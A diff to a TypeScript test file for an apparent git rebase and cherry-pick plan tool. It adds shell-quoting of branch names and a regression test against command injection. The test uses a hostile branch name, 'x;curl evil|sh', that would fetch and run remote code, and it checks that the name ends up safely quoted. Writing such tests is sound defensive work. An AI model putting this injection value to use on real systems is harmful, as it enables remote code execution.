@@ -14,6 +14,7 @@ import {
   reset,
   setAction,
   setText,
+  shq,
   verdict,
   warnings,
   type PlanBlock,
@@ -63,7 +64,7 @@ describe("paste", () => {
     r = setText(r, 1, "add auth with session cookies\n\nwhy: the old flow leaked");
     r = setAction(r, 2, "drop");
     expect(paste(block(r))).toEqual([
-      "git switch feat/auth",
+      "git switch 'feat/auth'",
       "cat > /tmp/wd-0000000-msg-1 <<'EOF'",
       "add auth with session cookies\n\nwhy: the old flow leaked",
       "EOF",
@@ -142,11 +143,23 @@ describe("paste", () => {
     );
   });
 
+  it("shell-quotes branch names so a hostile ref cannot break out", () => {
+    expect(shq("feat/auth")).toBe("'feat/auth'");
+    expect(shq("a'b")).toBe("'a'\\''b'");
+    // a rebase onto a branch whose name is a shell injection
+    const evil = block(rows(), { head: "x;curl evil|sh" });
+    const line = paste(evil).find((l) => l.startsWith("git switch"))!;
+    expect(line).toBe("git switch 'x;curl evil|sh'");
+    // a cherry-pick onto the same
+    const pk = paste(block(rows(), { mode: "pick", onto: "x;curl evil|sh", head: undefined }));
+    expect(pk[0]).toBe("git switch 'x;curl evil|sh'");
+  });
+
   it("writes a cherry-pick plan oldest first, dropped rows left out", () => {
     const r = setAction(rows(), 1, "drop");
     const b = block(r, { mode: "pick", onto: "release/1.x", head: undefined });
     expect(paste(b)).toEqual([
-      "git switch release/1.x",
+      "git switch 'release/1.x'",
       `git cherry-pick -x ${SHA("a")} ${SHA("c")}`,
     ]);
     const none = block(r.map((x) => ({ ...x, action: "drop" as const })), { mode: "pick", onto: "main" });
